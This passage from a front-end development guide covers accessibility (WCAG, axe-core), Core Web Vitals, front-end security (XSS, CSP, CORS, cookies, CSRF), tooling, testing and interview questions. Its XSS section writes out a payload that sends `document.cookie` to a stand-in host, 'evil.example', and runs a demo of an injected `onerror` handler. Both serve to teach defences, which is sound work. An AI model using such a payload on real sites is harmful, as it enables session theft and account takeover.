# Chapter 9: Accessibility
%Building for keyboard users, screen-reader users and everyone else, and measuring it

## 9.1 Why and what

About one in six people has a significant disability, and everyone is temporarily impaired at times (a broken arm, sunlight on a phone, a noisy train). Accessibility (**a11y**) is also a legal requirement in many countries and for government contracts. The standard is **WCAG 2.2**, organised under four principles (**POUR**): content must be **Perceivable** (text alternatives, contrast, captions), **Operable** (keyboard, enough time, no seizure triggers), **Understandable** (labels, predictable behaviour, error help) and **Robust** (valid markup that assistive technology can read). Level **AA** is the usual target.

## 9.2 The essentials

| Need | Do |
|---|---|
| Keyboard | Every action reachable with Tab and operable with Enter/Space; logical focus order; visible focus ring; no keyboard traps; "Skip to content" link |
| Names | Every control has an accessible name: `<label for>`, button text, `aria-label` for icon-only buttons, `alt` for images |
| Structure | Landmarks (`header`, `nav`, `main`), one `h1`, ordered headings, lists and tables for lists and tables |
| Colour | 4.5:1 text contrast (Section 4.5); never colour alone |
| Forms | Labels (not placeholders) for every field; errors in text, linked with `aria-describedby`; `aria-invalid` |
| Dynamic content | Announce changes with live regions (`aria-live="polite"`); move focus into dialogs and back out when they close |
| Motion and time | Respect `prefers-reduced-motion`; let users extend time limits |

**ARIA** (`role`, `aria-*` attributes) adds meaning where HTML has no element for it (tabs, comboboxes, live regions). The first rule of ARIA: **if a native element exists, use it**. A `<button>` gets focus, keyboard activation and the right role for free; a `<div role="button">` needs `tabindex="0"` and key handlers to match it, and is still easy to get wrong.

## 9.3 Measuring accessibility automatically

Automated checkers find roughly a third to a half of accessibility problems (the rest needs keyboard and screen-reader testing by a human). **axe-core**, the engine behind Lighthouse's accessibility audit and many CI tools, was run inside the page below.

```html run axe-core on an inaccessible sign-in form
<!doctype html>
<html><head><meta charset="utf-8"><title>bad</title></head><body>
<div class="header"><img src="logo.png"></div>
<div style="font-size: 26px; font-weight: bold">Sign in</div>
<input type="email" placeholder="Email">
<input type="password" placeholder="Password">
<div class="btn" onclick="signIn()" style="background: #60a5fa; color: white">Sign in</div>
<a href="#"><svg width="16" height="16"><circle cx="8" cy="8" r="8"/></svg></a>
<p style="color: #a3a3a3">Forgot your password? Contact support.</p>
<script src="lib/axe.js"></script>
<script>
  window.__ready = false;
  axe.run(document, { resultTypes: ['violations'] }).then(r => {
    for (const v of r.violations)
      console.log(`${v.impact.padEnd(8)} ${v.id} (elements: ${v.nodes.length})`);
    console.log('total violations:', r.violations.length);
    window.__ready = true;
  });
</script>
</body></html>
```

The fixed version uses `lang`, landmarks, a real heading, labels, a real button with enough contrast, a named icon link, and darker helper text:

```html run axe-core on the fixed form
<!doctype html>
<html lang="en"><head><meta charset="utf-8"><title>Sign in – MeterHub</title></head><body>
<header><img src="logo.png" alt="MeterHub"></header>
<main>
  <h1>Sign in</h1>
  <form>
    <label for="email">Email</label> <input id="email" type="email" autocomplete="email">
    <label for="pw">Password</label>
    <input id="pw" type="password" autocomplete="current-password">
    <button type="submit" style="background: #1d4ed8; color: white">Sign in</button>
  </form>
  <a href="/help" aria-label="Help"><svg width="16" height="16" aria-hidden="true">
    <circle cx="8" cy="8" r="8"/></svg></a>
  <p style="color: #525252">Forgot your password? Contact support.</p>
</main>
<script src="lib/axe.js"></script>
<script>
  window.__ready = false;
  axe.run(document, { resultTypes: ['violations'] }).then(r => {
    console.log('total violations:', r.violations.length,
                r.violations.map(v => v.id).join(', '));
    window.__ready = true;
  });
</script>
</body></html>
```

Run axe in CI (for example `@axe-core/playwright` in end-to-end tests) so that regressions fail the build, then test by hand: unplug the mouse and use the page with Tab, Shift+Tab, Enter, Space, Escape and the arrow keys; then try a screen reader (NVDA on Windows, VoiceOver on macOS and iOS, TalkBack on Android).

## 9.4 Focus management in a dialog

A modal dialog must move focus into itself when it opens, keep Tab inside while open, close on Escape, and return focus to the button that opened it. The native `<dialog>` element with `showModal()` does most of this, including making the rest of the page inert.

```html run The native dialog element handles focus and Escape
<button id="open">Delete meter</button>
<dialog id="dlg" aria-labelledby="dlg-title">
  <h2 id="dlg-title">Delete SM-42?</h2>
  <button id="cancel">Cancel</button> <button id="confirm">Delete</button>
</dialog>
<script>
  const dlg = document.getElementById('dlg'), open = document.getElementById('open');
  open.addEventListener('click', () => dlg.showModal());
  dlg.addEventListener('close', () => open.focus());          // return focus to the trigger
  open.focus(); open.click();
  console.log('open:', dlg.open, '| focus is on:', document.activeElement.id);
  dlg.dispatchEvent(new Event('cancel'));                      // what Escape triggers
  dlg.close();
  console.log('open:', dlg.open, '| focus returned to:', document.activeElement.id);
</script>
```

# Chapter 10: Performance and Core Web Vitals
%Measuring what users feel, and the techniques that improve it

## 10.1 What to measure

Google's **Core Web Vitals** measure real user experience (and influence search ranking):

| Metric | Measures | Good |
|---|---|---|
| **LCP** (Largest Contentful Paint) | When the main content (the largest image or text block) appeared | ≤ 2.5 s |
| **INP** (Interaction to Next Paint) | How quickly the page responds to clicks, taps and keys, across the visit | ≤ 200 ms |
| **CLS** (Cumulative Layout Shift) | How much visible content jumps around unexpectedly | ≤ 0.1 |

Also watch **TTFB** (time to first byte, a back-end and network matter) and **FCP** (first contentful paint). Measure in the lab (Lighthouse, WebPageTest, DevTools with CPU and network throttling) **and** in the field (real-user monitoring with the `web-vitals` library), because your fast laptop on office Wi-Fi is not your users' phone.

## 10.2 Layout shift, measured

CLS is caused by content that appears without reserved space: images without dimensions, ads, late-loading banners, web fonts that change text size. The browser reports every shift through the `PerformanceObserver` API.

```html run Measuring layout shift: an image without reserved space versus one with an aspect ratio
<style> body { margin: 0; font-family: "DejaVu Sans", sans-serif; } .slot { width: 300px; }
        img { display: block; width: 300px; } p { margin: 8px 0; } </style>
<div class="slot" id="a"></div><p>Paragraph below the first image.</p>
<div class="slot" id="b"></div><p>Paragraph below the second image.</p>
<script>
  window.__ready = false;
  const results = {};
  const svg = 'data:image/svg+xml,' + encodeURIComponent(
    '<svg xmlns="http://www.w3.org/2000/svg" width="600" height="300"><rect width="600" ' +
    'height="300" fill="%23bfdbfe"/></svg>'.replace('%23', '#'));
  function measure(id, reserve) {
    return new Promise(resolve => {
      let cls = 0;
      const obs = new PerformanceObserver(list => {
        for (const e of list.getEntries()) if (!e.hadRecentInput) cls += e.value;
      });
      obs.observe({ type: 'layout-shift', buffered: false });
      const img = new Image();
      if (reserve) img.style.aspectRatio = '2 / 1';             // space reserved up front
      document.getElementById(id).append(img);
      setTimeout(() => { img.src = svg; }, 100);               // the image "arrives" late
      setTimeout(() => { obs.disconnect(); resolve(cls); }, 400);
    });
  }
  (async () => {                // lower slot first, so the upper one cannot disturb it
    const withRatio = await measure('b', true);
    const without = await measure('a', false);
    console.log(`layout shift, no reserved space: ${without.toFixed(3)}`);
    console.log(`layout shift, aspect-ratio set:  ${withRatio.toFixed(3)}`);
    window.__ready = true;
  })();
</script>
```

Giving the image its dimensions (`width` and `height` attributes, or `aspect-ratio`) lets the browser reserve the space before the file arrives, and the shift disappears.

## 10.3 Loading less, and loading it sooner

| Technique | Effect |
|---|---|
| **Code splitting** with `import()` and route-level lazy loading (`React.lazy`) | Users download the code for the screen they are on, not the whole app |
| Tree shaking and minification (done by the bundler) | Dead code removed; smaller files |
| Compression (Brotli, gzip) on the server/CDN | Text assets 70–80% smaller |
| Modern image formats (AVIF, WebP), `srcset`/`sizes`, `loading="lazy"` below the fold, `fetchpriority="high"` for the LCP image | The largest bytes on most pages |
| Fonts: `font-display: swap`, subset, preload the one used above the fold | Text appears immediately |
| `preconnect` to API and CDN origins; `preload` critical assets | Handshakes start earlier |
| Long-lived caching of **hashed** files (`app.3f9c2a.js`, `Cache-Control: public, max-age=31536000, immutable`) and `no-cache` on `index.html` | Repeat visits load almost nothing, yet a deploy is picked up at once |
| A CDN | Files served from a nearby edge location |
| Avoid long tasks (> 50 ms) on the main thread; virtualise long lists; move heavy work to Web Workers | Good INP |

```js run Why a content hash in the file name makes caching safe
import { createHash } from 'node:crypto';
const hash = (source) => createHash('sha256').update(source).digest('hex').slice(0, 8);
const build = (source) => `app.${hash(source)}.js`;
const v1 = 'console.log("v1")', v2 = 'console.log("v2")';
console.log('build 1:', build(v1));
console.log('rebuild, no change:', build(v1));
console.log('build after a change:', build(v2));
console.log('index.html (never cached long) points at the new name: users get v2 at once');
```

Because the name changes whenever the content changes, a file can be cached "forever"; only the small `index.html`, which says which names to load, must always be revalidated.

## 10.4 Rendering lists of thousands

Rendering 10,000 table rows creates 10,000 × (cells) DOM nodes and makes every update slow. **Pagination**, **infinite scroll** or **virtualisation** (render only the ~30 visible rows and recycle them while scrolling; libraries such as TanStack Virtual) keep the DOM small.

# Chapter 11: Front-end Security
%XSS, CSP, CORS, cookies and tokens, and what the browser enforces for you

The security guide in this series covers the back end in depth; these are the front-end essentials.

## 11.1 Cross-site scripting (XSS)

XSS happens when attacker-controlled text is interpreted as **code** in your page: for example a meter name `<img src=x onerror="fetch('https://evil.example/?c='+document.cookie)">` saved by one user and displayed to an administrator. The script then runs with the victim's privileges: it can read the page, call your APIs as them, and steal tokens stored in JavaScript-readable places.

```html run innerHTML executes injected markup; textContent displays it
<ul id="unsafe"></ul><ul id="safe"></ul>
<script>
  window.stolen = [];
  window.__ready = false;
  const nameFromServer = 'SM-1<img src=x onerror="window.stolen.push(\'cookie!\')">';
  document.getElementById('unsafe').innerHTML = `<li>${nameFromServer}</li>`;   // vulnerable
  const li = document.createElement('li');
  li.textContent = nameFromServer;                                              // safe
  document.getElementById('safe').append(li);
  setTimeout(() => {
    console.log('payload executed via innerHTML:', window.stolen.length > 0);
    console.log('textContent shows it as text:', li.textContent.slice(0, 18) + '...');
    console.log('elements created inside the safe list:', li.children.length);
    window.__ready = true;
  }, 200);
</script>
```

Defences, in order:

1. **Render user data as text.** React escapes everything in `{}` automatically; avoid `dangerouslySetInnerHTML`, `innerHTML`, `document.write`, `eval` and `href={userUrl}` with `javascript:` URLs (validate that URLs start with `https:`).
2. When HTML from users is genuinely required (rich-text comments), **sanitise** it with a vetted library such as DOMPurify.
3. Add a **Content Security Policy** as a second line of defence.
4. Keep session tokens in `HttpOnly` cookies so that even a successful XSS cannot read them.

## 11.2 Content Security Policy

A CSP header (or `<meta http-equiv>`) tells the browser which sources of scripts, styles, images and connections are allowed. A strict policy blocks inline scripts and injected `onerror=` handlers, so most XSS payloads fail even if markup is injected.

```html run A CSP blocks an injected inline handler, and reports the violation
<!doctype html>
<html><head><meta charset="utf-8">
<meta http-equiv="Content-Security-Policy"
      content="default-src 'self'; script-src 'self' 'nonce-r4nd0m'; img-src 'self' data:">
</head><body>
<div id="out"></div>
<script nonce="r4nd0m">
  window.__ready = false;
  document.addEventListener('securitypolicyviolation', e =>
    console.log(`blocked by CSP: ${e.violatedDirective} (${e.blockedURI || 'inline code'})`));
  window.ran = false;
  document.getElementById('out').innerHTML = '<img src=x onerror="window.ran = true">';
  setTimeout(() => {
    console.log('injected handler ran:', window.ran);
    window.__ready = true;
  }, 300);
</script>
<script>console.log('this inline script without the nonce never runs');</script>
</body></html>
```

The script carrying the server-generated **nonce** ran; the inline script without it and the injected `onerror` handler were blocked, and the browser fired a violation event for each (in production, `report-to` sends these to your monitoring).

## 11.3 CORS and the same-origin policy

The browser's **same-origin policy** stops a script on `https://evil.example` from reading responses from `https://api.meterhub.in` with the user's cookies. **CORS** (Cross-Origin Resource Sharing) is how a server opts in to being read by other origins, with response headers such as `Access-Control-Allow-Origin: https://app.meterhub.in`. For "non-simple" requests (JSON bodies, custom headers, `PUT`/`DELETE`) the browser first sends an `OPTIONS` **preflight** to ask permission.

Key points: CORS is enforced **by browsers** to protect users; it is not an access-control mechanism for your API (curl ignores it), so authenticate and authorise on the server regardless. Never reflect any `Origin` back together with `Access-Control-Allow-Credentials: true`. A "CORS error" in the console is fixed on the **server** (or by serving the front end and API from the same origin through a reverse proxy), never by a browser extension.

## 11.4 Cookies, tokens and CSRF

| Option | XSS can steal it? | CSRF risk | Notes |
|---|---|---|---|
| Session cookie `HttpOnly; Secure; SameSite=Lax` | No (scripts cannot read it) | Low (`SameSite` blocks most cross-site sends) | The recommended default for web apps |
| JWT in `localStorage`, sent in `Authorization` header | **Yes** | None | Simple, but one XSS = account takeover |
| JWT in an `HttpOnly` cookie | No | Needs `SameSite` and/or CSRF tokens | Common compromise |

**CSRF** (cross-site request forgery): another site makes the user's browser send a request to your site, and the browser attaches your cookies. `SameSite=Lax` (default in modern browsers) stops cookies on cross-site `POST`s; for sensitive actions add a CSRF token (Spring Security does this) or require a custom header.

## 11.5 Other front-end hazards

- **Secrets in bundles**: anything in front-end code is public. Use the back end as a proxy for third-party APIs that need secret keys.
- **Third-party scripts** (analytics, chat widgets) run with full page privileges; load few, from trusted sources, with **Subresource Integrity** (`integrity="sha384-..."`) for CDN files.
- **Dependencies**: `npm audit`, Dependabot, lockfiles; supply-chain attacks target popular packages.
- **Clickjacking**: forbid framing with `Content-Security-Policy: frame-ancestors 'none'`.
- **Open redirects**: validate `?next=` URLs against an allow-list.

# Chapter 12: Tooling, Testing, Deployment and Interview Questions
%How a modern front end is built, tested and shipped

## 12.1 The toolchain

| Tool | Role |
|---|---|
| **npm**, pnpm, yarn | Install packages from `package.json`; the **lockfile** pins exact versions (commit it) |
| **Vite** (or webpack, Turbopack) | Dev server with hot reload; production build: bundles, compiles TypeScript/JSX, splits code, hashes file names, minifies |
| **TypeScript** | Type checking (`tsc --noEmit` in CI) |
| **ESLint**, Prettier | Find bugs and enforce style (`react-hooks` rules catch stale closures); format automatically |
| Frameworks | React (+ React Router or Next.js), Angular, Vue, Svelte; Next.js adds SSR, routing and server components |
| Styling | CSS Modules, Tailwind (utility classes), CSS-in-JS; a design-system component library |
| Storybook | Develop and document components in isolation, with all their states |

A new project: `npm create vite@latest meter-ui -- --template react-ts`, then `npm install`, `npm run dev` (development server) and `npm run build` (production files in `dist/`).

## 12.2 Testing

| Level | Tools | Tests |
|---|---|---|
| Unit | Vitest or Jest; Node's built-in `node:test` | Pure functions: formatting, validation, reducers |
| Component | React Testing Library | Render a component, interact **as a user would** (by label and role, not by CSS class), assert on what is shown |
| End-to-end | **Playwright**, Cypress | A real browser against a running app: sign in, add a reading, see it in the table |
| Visual regression | Playwright screenshots, Chromatic | Unintended pixel changes |
| Accessibility | axe in component and E2E tests | Section 9.3 |

```js run Unit tests for a formatting helper with Node's built-in test runner
// node --test (this block is run by the test runner)
import test from 'node:test';
import assert from 'node:assert/strict';
function formatKwh(value) {
  if (!Number.isFinite(value) || value < 0) throw new RangeError('invalid reading');
  return value >= 1000 ? `${(value / 1000).toFixed(2)} MWh` : `${value.toFixed(1)} kWh`;
}
test('formats small values in kWh with one decimal', () => {
  assert.equal(formatKwh(12.345), '12.3 kWh');
});
test('switches to MWh at 1000', () => {
  assert.equal(formatKwh(999.94), '999.9 kWh');
  assert.equal(formatKwh(1500), '1.50 MWh');
});
test('rejects negative and non-numeric input', () => {
  assert.throws(() => formatKwh(-1), RangeError);
  assert.throws(() => formatKwh(NaN), RangeError);
});
test('a deliberately wrong expectation, to show a failure', { todo: true }, () => {
  assert.equal(formatKwh(0.05), '0.0 kWh');
});
```

The `todo` test is reported but does not fail the run: a handy way to record a known gap. Its failure is itself instructive: `(0.05).toFixed(1)` gives `'0.1'`, although 0.05 is stored as a binary fraction slightly **above** 0.05 (0.05000000000000000277...), so here rounding up is in fact correct; for other values such as 1.005, `toFixed(2)` gives `'1.00'` because the stored value is slightly below. Never round money with floating point (Section 5.1).

The guide's own examples are a form of end-to-end test: each HTML block was opened in a real Chromium by Playwright, clicks and typing were simulated, and the console output and screenshots were captured.

## 12.3 Deployment

A built SPA is just static files: upload `dist/` to a static host or object storage behind a **CDN** (Netlify, Vercel, Cloudflare Pages, S3 + CloudFront, Firebase Hosting). Configure: HTTPS; long caching for hashed assets and `no-cache` for `index.html` (Section 10.3); a fallback so that deep links (`/meters/42`) serve `index.html` for client-side routing; security headers (CSP, HSTS, `X-Content-Type-Options: nosniff`, `frame-ancestors`). CI runs lint, type check and tests on every pull request, deploys a **preview** URL for review, and deploys to production on merge. Environment-specific values (the API base URL) are injected at build time; remember they are public.

## 12.4 Interview questions with the core of a good answer

| Question | Core of the answer |
|---|---|
| What happens when you type a URL and press Enter? | DNS, TCP, TLS, HTTP request; HTML parsed to DOM, CSS to CSSOM; scripts may block parsing; render tree, layout, paint, composite; then JavaScript hydrates or renders |
| Explain specificity. | (IDs, classes/attributes/pseudo-classes, elements); higher wins, then later wins; inline beats selectors; `!important` beats normal |
| Flexbox vs Grid? | One dimension vs two; content-out vs layout-in; often combined |
| `box-sizing: border-box`? | Width includes padding and border |
| How do you centre a div? | `display: grid; place-items: center` (or flex with `justify-content` and `align-items: center`) |
| `==` vs `===`? | Coercion vs none; always `===` |
| What is a closure? Give a use. | A function plus its captured scope; private state, factories, debounce |
| Explain the event loop. | Call stack, task queue, microtask queue; all microtasks run before the next task; why `setTimeout(0)` runs after promises |
| `let`, `const`, `var`? | Block vs function scope; TDZ; `const` prevents reassignment, not mutation |
| How does `this` work? | Determined by the call: method, plain call, `new`, `call/apply/bind`; arrows inherit |
| Event delegation? | One listener on an ancestor; `event.target.closest()`; works for dynamic children |
| Debounce vs throttle? Implement one. | After a pause vs at most once per interval; closure over a timer |
| `Promise.all` vs `allSettled` vs `race`? | All succeed / all outcomes / first settled |
| What triggers a React re-render? How do you avoid unnecessary ones? | State, parent render, context; memo + stable props, split state, measure first |
| Why do lists need keys? Why not the index? | Matching items across renders; index keys move state when the order changes |
| `useEffect` dependency array? Cleanup? | When to re-run; cleanup before re-run and on unmount; stale closures |
| Controlled vs uncontrolled inputs? | State is the source of truth vs the DOM is; refs |
| How would you fetch data in React? | Effect with cleanup/abort and loading/error states, or TanStack Query; race conditions |
| What are Core Web Vitals and how do you improve LCP and CLS? | LCP ≤ 2.5 s, INP ≤ 200 ms, CLS ≤ 0.1; preload/prioritise the hero image, compress, CDN; reserve space for media |
| What is XSS and how does React help? | Injected script in your page; React escapes text; avoid `dangerouslySetInnerHTML`; CSP; HttpOnly cookies |
| What is CORS? | Server opt-in for cross-origin reads; preflight; enforced by browsers; fix on the server |
| Where should you store a JWT? | Prefer HttpOnly, Secure, SameSite cookies; localStorage is exposed to XSS |
| How do you make a page accessible? | Semantic HTML, labels, keyboard, focus, contrast, ARIA only when needed, test with axe and a screen reader |
